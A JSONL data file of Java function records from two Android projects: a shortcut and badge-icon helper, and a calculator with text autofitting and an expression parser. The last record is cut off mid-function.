{"docstring": "/***\n * \u5f97\u5230\u4e00\u4e2a\u9ed8\u8ba4\u7684\u80cc\u666f\uff1a\u5706\u89d2\u77e9\u5f62<br><br>\n * \u4f7f\u7528\u4ee3\u7801\u6765\u751f\u6210\u4e00\u4e2a\u80cc\u666f\uff1a\u76f8\u5f53\u4e8e\u7528<shape>\u7684xml\u7684\u80cc\u666f\n *\n * @return \u5f97\u5230\u4e00\u4e2a\u9ed8\u8ba4\u7684\u80cc\u666f\n */\n", "func_signal": "private static ShapeDrawable getDefaultBackground2(Context context)", "code": "{\n    //\u8fd9\u4e2a\u662f\u4e3a\u4e86\u5e94\u5bf9\u4e0d\u540c\u5206\u8fa8\u7387\u7684\u624b\u673a\uff0c\u5c4f\u5e55\u517c\u5bb9\u6027\n    int r = dipToPixels(context, DEFAULT_CORNER_RADIUS_DIP);\n    float[] outerR = new float[]{r, r, r, r, r, r, r, r};\n    int distance = dipToPixels(context, DEFAULT_STROKE_WIDTH_DIP);\n    //\u5706\u89d2\u77e9\u5f62\n    RoundRectShape rr = new RoundRectShape(outerR, null, null);\n    ShapeDrawable drawable = new ShapeDrawable(rr);\n//        drawable.getFillpaint().setColor(DEFAULT_NUM_COLOR);//\u8bbe\u7f6e\u586b\u5145\u989c\u8272\n//        drawable.getStrokepaint().setColor(DEFAULT_STROKE_COLOR);//\u8bbe\u7f6e\u8fb9\u6846\u989c\u8272\n//        drawable.getStrokepaint().setStrokeWidth(distance);//\u8bbe\u7f6e\u8fb9\u6846\u5bbd\u5ea6\n    return drawable;\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * \u521b\u5efa\u539f\u751f\u7cfb\u7edf\u7684\u5feb\u6377\u65b9\u5f0f\n *\n * @param context   context\n * @param clazz     \u542f\u52a8\u7684activity\n * @param name      \u5feb\u6377\u65b9\u5f0f\u7684\u540d\u5b57\n * @param icon      \u56fe\u6807\n * @param isShowNum \u662f\u5426\u663e\u793a\u6570\u5b57\n * @param num       \u663e\u793a\u7684\u6570\u5b57\uff1a\u6574\u578b\n * @param isStroke  \u662f\u5426\u52a0\u4e0a\u8fb9\u6846\n */\n", "func_signal": "public static void installRawShortCut(Context context, Class<?> clazz, String name,\n        Bitmap icon, boolean isShowNum, String num, boolean isStroke)", "code": "{\n    Log.e(TAG, \"installShortCut....\");\n    Intent shortcutIntent = new Intent(\"com.android.launcher.action.INSTALL_SHORTCUT\");\n    //\u540d\u79f0\n    shortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, name);\n    // \u662f\u5426\u53ef\u4ee5\u6709\u591a\u4e2a\u5feb\u6377\u65b9\u5f0f\u7684\u526f\u672c\uff0c\u53c2\u6570\u5982\u679c\u662ftrue\u5c31\u53ef\u4ee5\u751f\u6210\u591a\u4e2a\u5feb\u6377\u65b9\u5f0f\uff0c\u5982\u679c\u662ffalse\u5c31\u4e0d\u4f1a\u91cd\u590d\u6dfb\u52a0\n    shortcutIntent.putExtra(\"duplicate\", false);\n    //\u70b9\u51fb\u5feb\u6377\u65b9\u5f0f\uff1a\u6253\u5f00activity\n    Intent mainIntent = new Intent(Intent.ACTION_MAIN);\n    mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);\n    mainIntent.setClass(context, clazz);\n    shortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, mainIntent);\n    //\u5feb\u6377\u65b9\u5f0f\u7684\u56fe\u6807\n    if (isStroke) {\n        shortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON,\n                generatorNumIcon4(context, icon, isShowNum, num));\n    } else {\n        shortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON,\n                generatorNumIcon2(context, icon, isShowNum, num));\n    }\n    context.sendBroadcast(shortcutIntent);\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * \u751f\u6210\u6709\u6570\u5b57\u7684\u56fe\u7247(\u6ca1\u6709\u8fb9\u6846)\n *\n * @param context   context\n * @param icon      \u56fe\u7247\n * @param isShowNum \u662f\u5426\u8981\u7ed8\u5236\u6570\u5b57\n * @param num       \u6570\u5b57\u5b57\u7b26\u4e32\uff1a\u6574\u578b\u6570\u5b57 \u8d85\u8fc799\uff0c\u663e\u793a\u4e3a\"99+\"\n * @return \u751f\u6210\u6709\u6570\u5b57\u7684\u56fe\u7247\n */\n", "func_signal": "public static Bitmap generatorNumIcon2(Context context, Bitmap icon, boolean isShowNum, String num)", "code": "{\n    DisplayMetrics dm = context.getResources().getDisplayMetrics();\n    //\u57fa\u51c6\u5c4f\u5e55\u5bc6\u5ea6\n    float baseDensity = 1.5f;//240dpi\n    float factor = dm.density / baseDensity;\n    Log.e(TAG, \"density:\" + dm.density);\n    Log.e(TAG, \"dpi:\" + dm.densityDpi);\n    Log.e(TAG, \"factor:\" + factor);\n    // \u521d\u59cb\u5316\u753b\u5e03\n    int iconSize = (int) context.getResources().getDimension(android.R.dimen.app_icon_size);\n    Bitmap numIcon = Bitmap.createBitmap(iconSize, iconSize, Bitmap.Config.ARGB_8888);\n    Canvas canvas = new Canvas(numIcon);\n    // \u62f7\u8d1d\u56fe\u7247\n    Paint iconPaint = new Paint();\n    iconPaint.setDither(true);// \u9632\u6296\u52a8\n    iconPaint.setFilterBitmap(true);// \u7528\u6765\u5bf9Bitmap\u8fdb\u884c\u6ee4\u6ce2\u5904\u7406\uff0c\u8fd9\u6837\uff0c\u5f53\u4f60\u9009\u62e9Drawable\u65f6\uff0c\u4f1a\u6709\u6297\u952f\u9f7f\u7684\u6548\u679c\n    Rect src = new Rect(0, 0, icon.getWidth(), icon.getHeight());\n    Rect dst = new Rect(0, 0, iconSize, iconSize);\n    canvas.drawBitmap(icon, src, dst, iconPaint);\n    if (isShowNum) {\n        if (TextUtils.isEmpty(num)) {\n            num = \"0\";\n        }\n        if (!TextUtils.isDigitsOnly(num)) {\n            //\u975e\u6570\u5b57\n            Log.e(TAG, \"the num is not digit :\" + num);\n            num = \"0\";\n        }\n        int numInt = Integer.valueOf(num);\n        if (numInt > 99) {//\u8d85\u8fc799\n            num = \"99+\";\n        }\n        //\u542f\u7528\u6297\u952f\u9f7f\u548c\u4f7f\u7528\u8bbe\u5907\u7684\u6587\u672c\u5b57\u4f53\u5927\u5c0f\n        //\u6d4b\u91cf\u6587\u672c\u5360\u7528\u7684\u5bbd\u5ea6\n        Paint numPaint = new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DEV_KERN_TEXT_FLAG);\n        numPaint.setColor(Color.WHITE);\n        numPaint.setTextSize(20f * factor);\n        numPaint.setTypeface(Typeface.DEFAULT_BOLD);\n        int textWidth = (int) numPaint.measureText(num, 0, num.length());\n        Log.e(TAG, \"text width:\" + textWidth);\n        /**----------------------------------*\n         * TODO \u7ed8\u5236\u5706\u89d2\u77e9\u5f62\u80cc\u666f start\n         *------------------------------------*/\n        //\u5706\u89d2\u77e9\u5f62\u80cc\u666f\u7684\u5bbd\u5ea6\n        int backgroundHeight = (int) (2 * 15 * factor);\n        int backgroundWidth = textWidth > backgroundHeight ? (int) (textWidth + 10 * factor) : backgroundHeight;\n        canvas.save();//\u4fdd\u5b58\u72b6\u6001\n        ShapeDrawable drawable = getDefaultBackground(context);\n        drawable.setIntrinsicHeight(backgroundHeight);\n        drawable.setIntrinsicWidth(backgroundWidth);\n        drawable.setBounds(0, 0, backgroundWidth, backgroundHeight);\n        canvas.translate(iconSize - backgroundWidth, 0);\n        drawable.draw(canvas);\n        canvas.restore();//\u91cd\u7f6e\u4e3a\u4e4b\u524d\u4fdd\u5b58\u7684\u72b6\u6001\n        /**----------------------------------*\n         * TODO \u7ed8\u5236\u5706\u89d2\u77e9\u5f62\u80cc\u666f end\n         *------------------------------------*/\n        //\u7ed8\u5236\u6570\u5b57\n        canvas.drawText(num, (float) (iconSize - (backgroundWidth + textWidth) / 2), 22 * factor, numPaint);\n    }\n    return numIcon;\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * \u751f\u6210\u6709\u6570\u5b57\u7684\u56fe\u7247(\u6709\u8fb9\u6846)\n *\n * @param context   context\n * @param icon      \u56fe\u7247\n * @param isShowNum \u662f\u5426\u8981\u7ed8\u5236\u6570\u5b57\n * @param num       \u6570\u5b57\u5b57\u7b26\u4e32\uff1a\u6574\u578b\u6570\u5b57 \u8d85\u8fc799\uff0c\u663e\u793a\u4e3a\"99+\"\n * @return \u751f\u6210\u6709\u6570\u5b57\u7684\u56fe\u7247\n */\n", "func_signal": "public static Bitmap generatorNumIcon3(Context context, Bitmap icon, boolean isShowNum, String num)", "code": "{\n    DisplayMetrics dm = context.getResources().getDisplayMetrics();\n    //\u57fa\u51c6\u5c4f\u5e55\u5bc6\u5ea6\n    float baseDensity = 1.5f;//240dpi\n    float factor = dm.density / baseDensity;\n    Log.e(TAG, \"density:\" + dm.density);\n    Log.e(TAG, \"dpi:\" + dm.densityDpi);\n    Log.e(TAG, \"factor:\" + factor);\n    // \u521d\u59cb\u5316\u753b\u5e03\n    int iconSize = (int) context.getResources().getDimension(android.R.dimen.app_icon_size);\n    Bitmap numIcon = Bitmap.createBitmap(iconSize, iconSize, Bitmap.Config.ARGB_8888);\n    Canvas canvas = new Canvas(numIcon);\n    // \u62f7\u8d1d\u56fe\u7247\n    Paint iconPaint = new Paint();\n    iconPaint.setDither(true);// \u9632\u6296\u52a8\n    iconPaint.setFilterBitmap(true);// \u7528\u6765\u5bf9Bitmap\u8fdb\u884c\u6ee4\u6ce2\u5904\u7406\uff0c\u8fd9\u6837\uff0c\u5f53\u4f60\u9009\u62e9Drawable\u65f6\uff0c\u4f1a\u6709\u6297\u952f\u9f7f\u7684\u6548\u679c\n    Rect src = new Rect(0, 0, icon.getWidth(), icon.getHeight());\n    Rect dst = new Rect(0, 0, iconSize, iconSize);\n    canvas.drawBitmap(icon, src, dst, iconPaint);\n    if (isShowNum) {\n        if (TextUtils.isEmpty(num)) {\n            num = \"0\";\n        }\n        if (!TextUtils.isDigitsOnly(num)) {\n            //\u975e\u6570\u5b57\n            Log.e(TAG, \"the num is not digit :\" + num);\n            num = \"0\";\n        }\n        int numInt = Integer.valueOf(num);\n        if (numInt > 99) {//\u8d85\u8fc799\n            num = \"99+\";\n        }\n        //\u542f\u7528\u6297\u952f\u9f7f\u548c\u4f7f\u7528\u8bbe\u5907\u7684\u6587\u672c\u5b57\u4f53\u5927\u5c0f\n        //\u6d4b\u91cf\u6587\u672c\u5360\u7528\u7684\u5bbd\u5ea6\n        Paint numPaint = new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DEV_KERN_TEXT_FLAG);\n        numPaint.setColor(Color.WHITE);\n        numPaint.setTextSize(20f * factor);\n        numPaint.setTypeface(Typeface.DEFAULT_BOLD);\n        int textWidth = (int) numPaint.measureText(num, 0, num.length());\n        Log.e(TAG, \"text width:\" + textWidth);\n        /**----------------------------------*\n         * TODO \u7ed8\u5236\u5706\u89d2\u77e9\u5f62\u80cc\u666f\uff1a\u5148\u753b\u8fb9\u6846\uff0c\u518d\u753b\u5185\u90e8\u7684\u5706\u89d2\u77e9\u5f62 start\n         *------------------------------------*/\n        //\u5706\u89d2\u77e9\u5f62\u80cc\u666f\u7684\u5bbd\u5ea6\n        int backgroundHeight = (int) (2 * 15 * factor);\n        int backgroundWidth = textWidth > backgroundHeight ? (int) (textWidth + 10 * factor) : backgroundHeight;\n        //\u8fb9\u6846\u7684\u5bbd\u5ea6\n        int strokeThickness = (int) (2 * factor);\n        canvas.save();//\u4fdd\u5b58\u72b6\u6001\n        int strokeHeight = backgroundHeight + strokeThickness * 2;\n        int strokeWidth = textWidth > strokeHeight ? (int) (textWidth + 10 * factor + 2 * strokeThickness) : strokeHeight;\n        ShapeDrawable outStroke = getDefaultStrokeDrawable(context);\n        outStroke.setIntrinsicHeight(strokeHeight);\n        outStroke.setIntrinsicWidth(strokeWidth);\n        outStroke.setBounds(0, 0, strokeWidth, strokeHeight);\n        canvas.translate(iconSize - strokeWidth - strokeThickness, strokeThickness);\n        outStroke.draw(canvas);\n        canvas.restore();//\u91cd\u7f6e\u4e3a\u4e4b\u524d\u4fdd\u5b58\u7684\u72b6\u6001\n        canvas.save();//\u4fdd\u5b58\u72b6\u6001\n        ShapeDrawable drawable = getDefaultBackground(context);\n        drawable.setIntrinsicHeight((int) (backgroundHeight + 2 * factor));\n        drawable.setIntrinsicWidth((int) (backgroundWidth + 2 * factor));\n        drawable.setBounds(0, 0, backgroundWidth, backgroundHeight);\n        canvas.translate(iconSize - backgroundWidth - 2 * strokeThickness, 2 * strokeThickness);\n        drawable.draw(canvas);\n        canvas.restore();//\u91cd\u7f6e\u4e3a\u4e4b\u524d\u4fdd\u5b58\u7684\u72b6\u6001\n        /**----------------------------------*\n         * TODO \u7ed8\u5236\u5706\u89d2\u77e9\u5f62\u80cc\u666f end\n         *------------------------------------*/\n        //\u7ed8\u5236\u6570\u5b57\n        canvas.drawText(num, (float) (iconSize - (backgroundWidth + textWidth + 4 * strokeThickness) / 2), (22) * factor + 2 * strokeThickness, numPaint);\n    }\n    return numIcon;\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * \u5728\u5e94\u7528\u56fe\u6807\u7684\u5feb\u6377\u65b9\u5f0f\u4e0a\u52a0\u6570\u5b57\n *\n * @param clazz     \u542f\u52a8\u7684activity\n * @param isShowNum \u662f\u5426\u663e\u793a\u6570\u5b57\n * @param num       \u663e\u793a\u7684\u6570\u5b57\uff1a\u6574\u578b\n * @param isStroke  \u662f\u5426\u52a0\u4e0a\u8fb9\u6846\n */\n", "func_signal": "public static void addNumShortCut(Context context, Class<?> clazz, boolean isShowNum, String num, boolean isStroke)", "code": "{\n    Log.e(TAG, \"manufacturer=\" + Build.MANUFACTURER);\n    if (Build.MANUFACTURER.equalsIgnoreCase(\"Xiaomi\")) {\n        //\u5c0f\u7c73\n        xiaoMiShortCut(context, clazz, num);\n    } else if (Build.MANUFACTURER.equalsIgnoreCase(\"samsung\")) {\n        //\u4e09\u661f\n        samsungShortCut(context, num);\n    } else {//\u5176\u4ed6\u539f\u751f\u7cfb\u7edf\u624b\u673a\n//            installRawShortCut(context, MainActivity.class, isShowNum, num, isStroke);\n    }\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/**\n * Set the minimum text size to a given unit and value. See TypedValue for the possible\n * dimension units.\n *\n * @param unit The desired dimension unit.\n * @param size The desired size in the given units.\n * @attr ref me.grantland.R.styleable#AutofitTextView_minTextSize\n */\n", "func_signal": "public AutofitHelper setMinTextSize(int unit, float size)", "code": "{\n    Context context = mTextView.getContext();\n    Resources r = Resources.getSystem();\n\n    if (context != null) {\n        r = context.getResources();\n    }\n\n    setRawMinTextSize(TypedValue.applyDimension(unit, size, r.getDisplayMetrics()));\n    return this;\n}", "path": "app\\src\\main\\java\\com\\sf\\DarkCalculator\\AutofitHelper.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "/**\n * Adds an {@link OnTextSizeChangeListener} to the list of those whose methods are called\n * whenever the {@link TextView}'s {@code textSize} changes.\n */\n", "func_signal": "public AutofitHelper addOnTextSizeChangeListener(OnTextSizeChangeListener listener)", "code": "{\n    if (mListeners == null) {\n        mListeners = new ArrayList<OnTextSizeChangeListener>();\n    }\n    mListeners.add(listener);\n    return this;\n}", "path": "app\\src\\main\\java\\com\\sf\\DarkCalculator\\AutofitHelper.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "// get a number digit from char under certain base\n", "func_signal": "private static int getDigit(char c, int base) throws NumberFormatException", "code": "{\n    int digit;\n    if (c >= '0' && c <= '9') { // in base 10\n        digit = c - '0';\n    } else if (c >= 'A' && c <= 'F') { // in base 16\n        digit = c - 'A' + 10;\n    } else { // not a valid digit\n        throw new NumberFormatException();\n    }\n    if (digit >= base) throw new NumberFormatException();\n    return digit;\n}", "path": "app\\src\\main\\java\\com\\sf\\ExpressionHandler\\ParseNumber.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "// directional limit\n", "func_signal": "public Result limit(int l, int r, Complex x0, Complex dir)", "code": "{\n    if (dir.re == 0 && dir.im == 0 || !dir.isFinite())\n        return new Result(1).setAnswer(\"\u65e0\u6548\u7684\u65b9\u5411\u503c\");\n\n\n    List<Complex> histRes = new ArrayList<>();\n    double minDe = 1E200;\n    int minPos = -1;\n    double norm = dir.norm().re;\n\n    int cnt = 0;\n    int overErrorRangeCount = 0;\n    double h;\n    for (h = 1E-1; h >= 1E-10; h *= 0.9, cnt++) {\n        Complex delta = new Complex(dir.re / norm * h, dir.im / norm * h);\n        Result resR = limitH(l, r, x0, delta);\n        if (resR.isFatalError()) return new Result(1).setAnswer(\"\u672a\u627e\u5230\u6781\u9650\");\n        Complex res = resR.val;\n\n        if (cnt > 0) {\n            double e = Complex.sub(res, histRes.get(cnt - 1)).norm().re;\n\n            if (e < minDe) {\n                overErrorRangeCount = 0;\n                minDe = e;\n                minPos = cnt;\n            } else { // e >= minDe or e is NaN!\n                overErrorRangeCount++;\n            }\n            if (overErrorRangeCount > 20) {\n                break;\n            }\n\n        }\n        histRes.add(res);\n    }\n\n    if (minPos < 1) {\n        return new Result(1).setAnswer(\"\u51fd\u6570\u5728\u7ed9\u5b9a\u70b9\u4e0a\u53ef\u80fd\u6ca1\u6709\u6536\u655b\");\n    }\n    Complex minRes = histRes.get(minPos - 1);\n\n    if (minDe > 1E-5) { // didn't found ?\n        return new Result(1).setAnswer(\"\u51fd\u6570\u5728\u7ed9\u5b9a\u70b9\u4e0a\u53ef\u80fd\u6ca1\u6709\u6536\u655b\");\n    } else { // found\n        return new Result(minRes);\n    }\n}", "path": "app\\src\\main\\java\\com\\sf\\ExpressionHandler\\Expression.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "/**\n * Creates a new instance of {@code AutofitHelper} that wraps a {@link TextView} and enables\n * automatically sizing the text to fit.\n */\n", "func_signal": "public static AutofitHelper create(TextView view, AttributeSet attrs, int defStyle)", "code": "{\n    AutofitHelper helper = new AutofitHelper(view);\n    boolean sizeToFit = true;\n    if (attrs != null) {\n        Context context = view.getContext();\n        int minTextSize = (int) helper.getMinTextSize();\n        float precision = helper.getPrecision();\n\n        TypedArray ta = context.obtainStyledAttributes(\n                attrs,\n                R.styleable.AutofitTextView,\n                defStyle,\n                0);\n        sizeToFit = ta.getBoolean(R.styleable.AutofitTextView_sizeToFit, sizeToFit);\n        minTextSize = ta.getDimensionPixelSize(R.styleable.AutofitTextView_minTextSize,\n                minTextSize);\n        precision = ta.getFloat(R.styleable.AutofitTextView_precision, precision);\n        ta.recycle();\n\n        helper.setMinTextSize(TypedValue.COMPLEX_UNIT_PX, minTextSize)\n                .setPrecision(precision);\n    }\n    helper.setEnabled(sizeToFit);\n\n    return helper;\n}", "path": "app\\src\\main\\java\\com\\sf\\DarkCalculator\\AutofitHelper.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "/**\n * Set the enabled state of automatically resizing text.\n */\n", "func_signal": "public AutofitHelper setEnabled(boolean enabled)", "code": "{\n    if (mEnabled != enabled) {\n        mEnabled = enabled;\n\n        if (enabled) {\n            mTextView.addTextChangedListener(mTextWatcher);\n            mTextView.addOnLayoutChangeListener(mOnLayoutChangeListener);\n\n            autofit();\n        } else {\n            mTextView.removeTextChangedListener(mTextWatcher);\n            mTextView.removeOnLayoutChangeListener(mOnLayoutChangeListener);\n\n            mTextView.setTextSize(TypedValue.COMPLEX_UNIT_PX, mTextSize);\n        }\n    }\n    return this;\n}", "path": "app\\src\\main\\java\\com\\sf\\DarkCalculator\\AutofitHelper.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "/**\n * Set the amount of precision used to calculate the correct text size to fit within its\n * bounds. Lower precision is more precise and takes more time.\n *\n * @param precision The amount of precision.\n */\n", "func_signal": "public AutofitHelper setPrecision(float precision)", "code": "{\n    if (mPrecision != precision) {\n        mPrecision = precision;\n\n        autofit();\n    }\n    return this;\n}", "path": "app\\src\\main\\java\\com\\sf\\DarkCalculator\\AutofitHelper.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "// for memory function\n", "func_signal": "public Expression(String s)", "code": "{\n       text = s;\n       br = new int[s.length() + 1];\n       lastLB = new int[s.length() + 1];\n       nextFS = new int[s.length() + 1];\n       commaCnt = new int[s.length() + 1];\n       brDiff = 0;\n\n       int[] symbolStack = new int[s.length() + 1]; // a position stack of all left brackets\n       int[] lastSymbol = new int[s.length() + 1]; // what's the position of the last symbol ?\n\n       int top = -1;\n\n       br[0] = 0;\n       for (int i = 0; i < s.length(); i++) {\n           lastLB[i] = -1;\n           nextFS[i] = -1;\n           commaCnt[i] = 0;\n           char c = s.charAt(i);\n           if (i > 0) {\n               br[i] = br[i - 1];\n               if (s.charAt(i - 1) == '(') br[i]++;\n               if (c == ')') br[i]--;\n           }\n\n           if (c == '(') { // push\n               top++;\n               symbolStack[top] = i;\n               lastLB[i] = i;\n               lastSymbol[top] = i;\n               brDiff++;\n           }\n           if (c == ',' && top >= 0) { // record\n               lastLB[i] = symbolStack[top];\n               commaCnt[symbolStack[top]]++;\n               nextFS[lastSymbol[top]] = i;\n               lastSymbol[top] = i;\n           }\n           if (c == ')') {\n               if (top >= 0) { // pop\n                   lastLB[i] = symbolStack[top];\n                   nextFS[lastSymbol[top]] = i;\n                   top--;\n               }\n               brDiff--;\n           }\n       }\n   }", "path": "app\\src\\main\\java\\com\\sf\\ExpressionHandler\\Expression.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "// permutation & combination\n", "func_signal": "private Complex permIter(Complex n_, Complex m_)", "code": "{ // Gamma(n+1)/Gamma(m+1)\n    Complex n, m;\n    Complex ans = new Complex(1);\n    n = n_;\n    m = m_;\n\n    while (true) { // adapted from iteration\n        if (n.re > 1 && m.re > 1) {\n            if (n.re - m.re >= 1) {\n                ans = Complex.mul(new Complex(n.re), ans);\n                n.re -= 1;\n            } else if (m.re - n.re >= 1) {\n                ans = Complex.div(ans, new Complex(m.re));\n                m.re -= 1;\n            } else {\n                ans = Complex.mul(new Complex(n.re / m.re), ans);\n                n.re -= 1;\n                m.re -= 1;\n            }\n        } else if (n.re == m.re && n.im == m.im) {\n            break;\n        } else {\n            Complex af = Complex.div(Complex.gamma(new Complex(n.re + 1, n.im)), Complex.gamma(new Complex(m.re + 1, m.im)));\n            ans = Complex.mul(af, ans);\n            break;\n        }\n        if (!ans.isFinite()) { // invalid value occurred, no need to continue\n            break;\n        }\n        if (!isWorking) return new Complex().error(2);\n    }\n\n    return ans;\n}", "path": "app\\src\\main\\java\\com\\sf\\ExpressionHandler\\Expression.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "/**\n * Removes the specified {@link OnTextSizeChangeListener} from the list of those whose methods\n * are called whenever the {@link TextView}'s {@code textSize} changes.\n */\n", "func_signal": "public AutofitHelper removeOnTextSizeChangeListener(OnTextSizeChangeListener listener)", "code": "{\n    if (mListeners != null) {\n        mListeners.remove(listener);\n    }\n    return this;\n}", "path": "app\\src\\main\\java\\com\\sf\\DarkCalculator\\AutofitHelper.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "// parse a float number presentation under certain base\n", "func_signal": "public static double parse(String s) throws NumberFormatException", "code": "{\n\n    int base = 0;\n    int baseSymbolPos = -1;\n    for (int i = 0; i < s.length(); i++) {\n        base = baseSymbol.indexOf(s.charAt(i));\n        if (base > 0) { // base 0 if invalid\n            baseSymbolPos = i;\n            break;\n        }\n    }\n    if (baseSymbolPos == 0) throw new NumberFormatException();\n    if (baseSymbolPos < 0) return parseCompat(s); // parse the string as a compat format\n\n\n    int exp;\n    if (baseSymbolPos == s.length() - 1) {\n        exp = 0;\n    } else {\n        exp = Integer.parseInt(s.substring(baseSymbolPos + 1));\n    }\n    double frac = parseRaw(s.substring(0, baseSymbolPos), base);\n\n    return frac * Math.pow(base, exp);\n}", "path": "app\\src\\main\\java\\com\\sf\\ExpressionHandler\\ParseNumber.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "/**\n * Set the original text size of the View.\n *\n * @see TextView#setTextSize(int, float)\n */\n", "func_signal": "public void setTextSize(int unit, float size)", "code": "{\n    if (mIsAutofitting) {\n        // We don't want to update the TextView's actual textSize while we're autofitting\n        // since it'd get set to the autofitTextSize\n        return;\n    }\n    Context context = mTextView.getContext();\n    Resources r = Resources.getSystem();\n\n    if (context != null) {\n        r = context.getResources();\n    }\n\n    setRawTextSize(TypedValue.applyDimension(unit, size, r.getDisplayMetrics()));\n}", "path": "app\\src\\main\\java\\com\\sf\\DarkCalculator\\AutofitHelper.java", "repo_name": "HK-SHAO/DarkCalculator", "stars": 576, "license": "mit", "language": "java", "size": 2216}
{"docstring": "// 0+NaN*I is never possible during a calculation\n// and is so used as \"No Variable X provided\" sign\n", "func_signal": "public Result value(int l, int r, Complex vX)", "code": "{\n    if (!isWorking) return new Result(2);\n\n    if (l > r) {\n        return new Result(1).setAnswer(\"\u8868\u8fbe\u5f0f\u8bed\u6cd5\u9519\u8bef\");\n    }\n\n    // Check if result cached\n    SymbolCachePair pair = interpretResult[l].checkCache(r);\n    if (pair != null) { // cached result\n        Result r1, r2;\n        switch (pair.symbol) { // No fatal error now\n            case SymbolCachePair.SYMBOL_CONST:\n            case SymbolCachePair.SYMBOL_NUM:\n                return new Result(pair.cachedValue);\n            case SymbolCachePair.SYMBOL_ADD:\n                r1 = value(l, pair.symbol_pos - 1, vX);\n                r2 = value(pair.symbol_pos + 1, r, vX);\n                return new Result(Complex.add(r1.val, r2.val));\n            case SymbolCachePair.SYMBOL_SUB:\n                r1 = value(l, pair.symbol_pos - 1, vX);\n                r2 = value(pair.symbol_pos + 1, r, vX);\n                return new Result(Complex.sub(r1.val, r2.val));\n            case SymbolCachePair.SYMBOL_POS:\n                return value(l + 1, r, vX);\n            case SymbolCachePair.SYMBOL_NEG:\n                r1 = value(l + 1, r, vX);\n                return new Result(Complex.inv(r1.val));\n            case SymbolCachePair.SYMBOL_MUL:\n                r1 = value(l, pair.symbol_pos - 1, vX);\n                r2 = value(pair.symbol_pos + 1, r, vX);\n                return new Result(Complex.mul(r1.val, r2.val));\n            case SymbolCachePair.SYMBOL_DIV:\n                r1 = value(l, pair.symbol_pos - 1, vX);\n                r2 = value(pair.symbol_pos + 1, r, vX);\n                return new Result(Complex.div(r1.val, r2.val));\n            case SymbolCachePair.SYMBOL_MUL_OMIT:\n                r1 = value(l, pair.symbol_pos - 1, vX);\n                r2 = value(pair.symbol_pos, r, vX); // Attention to the pos!\n                return new Result(Complex.mul(r1.val, r2.val));\n            case SymbolCachePair.SYMBOL_POW:\n                r1 = value(l, pair.symbol_pos - 1, vX);\n                r2 = value(pair.symbol_pos + 1, r, vX);\n                return new Result(Complex.pow(r1.val, r2.val));\n            case SymbolCachePair.SYMBOL_SQRT:\n                r1 = value(l + 1, r, vX);\n                return new Result(Complex.sqrt(r1.val));\n            case SymbolCachePair.SYMBOL_FUNC:\n                return funcValue(l, r, vX);\n            case SymbolCachePair.SYMBOL_BRACKET:\n                return value(l + 1, r - 1, vX);\n            case SymbolCachePair.SYMBOL_FACT:\n                r1 = value(l, pair.symbol_pos - 1, vX);\n                return fact(r1.val);\n        }\n    }\n\n    // Interpret expression\n    String s = text.substring(l, r + 1);\n\n    // Variable\n    if (s.equals(\"x\") && (vX.isValid() || vX.isNaN())) return new Result(vX); // variable X\n    if (s.equals(\"reg\")) return new Result(memValue); // reg value\n\n    // omit space and enter\n    if (text.charAt(l) == ' ' || text.charAt(l) == '\\n' || text.charAt(l) == '\\r')\n        return value(l + 1, r, vX);\n    if (text.charAt(r) == ' ' || text.charAt(r) == '\\n' || text.charAt(r) == '\\r')\n        return value(l, r - 1, vX);\n\n    /*======================= Below this line, string will be parsed only once ========================*/\n\n    { // Constants\n        Complex complexConst = null;\n        if (s.equals(\"e\")) complexConst = Complex.E; // constant e\n        else if (s.equals(\"\u03c0\")) complexConst = Complex.PI; // constant pi\n        else if (s.equals(\"i\")) complexConst = Complex.I; // constant i\n        else if (s.equals(\"\u221e\")) complexConst = Complex.Inf; // constant Infinity\n        else if (s.equals(\"\u00b0\")) complexConst = new Complex(Math.PI / 180); // degree value\n        else if (s.equals(\"%\")) complexConst = new Complex(0.01); // percent value\n        else {\n            String constValue = Constants.load().get(s);\n            if (constValue != null) {\n                complexConst = new 